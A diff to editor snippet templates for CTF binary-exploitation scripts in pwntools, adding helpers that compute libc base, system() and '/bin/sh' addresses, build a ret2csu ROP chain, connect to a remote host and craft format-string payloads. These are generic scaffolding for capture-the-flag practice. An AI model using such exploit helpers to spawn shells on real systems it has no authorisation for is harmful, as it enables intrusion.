@@ -1,28 +1,56 @@
 snippet pwn "ctf-pwn template"
 from pwn import *
-from LibcSearcher import LibcSearcher
+from LibcSearcher import LibcSearcher 
 import os
 
 ARCH="${1}"
 LOGLEVEL="debug"
 BINARY="${2}"
+libc = "" 
 REMOTE_HOST = ""
-REMOTE_PORT = 40000
+REMOTE_PORT = 80
 
 gs = '''
 # break *0x
-continue
+continue 
 '''
 
 context.update(arch=ARCH, log_level=LOGLEVEL, terminal=['tmux', 'splitw', '-h'])
 elf = context.binary = ELF(BINARY)
-
-try:
-	libc = ELF(os.path.join(os.path.dirname(elf.runpath), 'libc.so.6'))
-except Exception:
-	pass
-
 rop = ROP(elf)
+
+
+def load_libc():
+	global libc
+	if libc != "":
+		libc = ELF(libc)
+	elif ARCH == "amd64":
+		libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
+	elif ARCH == "i386":
+		libc = ELF('/lib/i386-linux-gnu/libc-2.31.so')
+
+def libc_infos(fname, faddr, search=False, online=False):
+	global libc
+	if search:
+		libc = LibcSearcher(fname, faddr, online)
+		libc_base = faddr - libc.dump(fname)
+		return (libc_base, libc_base + libc.dump('system'), libc_base + libc.dump('str_bin_sh'))
+	else:
+		libc_base = faddr - libc.sym[fname] 
+		return (libc_base, libc_base + libc.sym.system, libc_base + next(libc.search(b'/bin/sh'))) 
+
+def ret2csu(part1, part2, jmp2, arg1=0x0, arg2=0x0, arg3=0x0):
+	return flat([
+		p64(part1),   # entry of pop_rbx_rbp_r12_r13_r14_r15_ret
+		p64(0x0),     # rbx
+		p64(0x1),     # rbp
+		p64(jmp2),    # r12
+		p64(arg3),    # r13 -> rdx
+		p64(arg2),    # r14 -> rsi
+		p64(arg1),    # r15 -> edi
+		p64(part2),   # entry will call [r12+rbx*8]
+		cyclic(56)    # junk
+	]) 
 
 def start():
 	if args.GDB:
@@ -30,31 +58,31 @@ def start():
 	elif args.ATTACH:
 		proc = elf.process()
 		gdb.attach(proc, gs)
-		return proc
+		return proc 
 	elif args.REMOTE:
 		return remote(REMOTE_HOST, REMOTE_PORT)
 	else:
 		return elf.process()
 
+# rop gadgets:
+
+
+
 if __name__ == '__main__':
-	io = start()
-
+	load_libc()
+	io = start() 
+	
 	${3}
-
+	
 	io.interactive()
 endsnippet
 
 snippet libc "ctf-pwn-libc template"
-TARGET_FUNNAME = '${1}'
-TARGET_ADDRESS = '${2}'
-libc = LibcSearcher(TARGET_FUNNAME, TARGET_ADDRESS)
-libc_base = TARGET_ADDRESS - libc.dump(TARGET_FUNNAME)
-system_add = libc_base + libc.dump('system')
-bin_sh_add = libc_base + libc.dump('str_bin_sh')
+libc_base, system_add, bin_sh_add = libc_infos('${1}', ${2}, search=False, online=False)
 
-log.info('libc@: {:#x}'.format(libc_base))
-log.info('system@libc: {:#x}'.format(system_add))
-log.info('str_bin_sh@libc: {:#x}'.format(bin_sh_add))
+log.success('libc@: {:#x}'.format(libc_base))
+log.success('system@libc: {:#x}'.format(system_add))
+log.success('str_bin_sh@libc: {:#x}'.format(bin_sh_add))
 
 endsnippet
 
@@ -68,3 +96,4 @@ offset = auto.offset
 payload = fmtstr_payload(offset, {${1}: ${2}})
 
 endsnippet
+
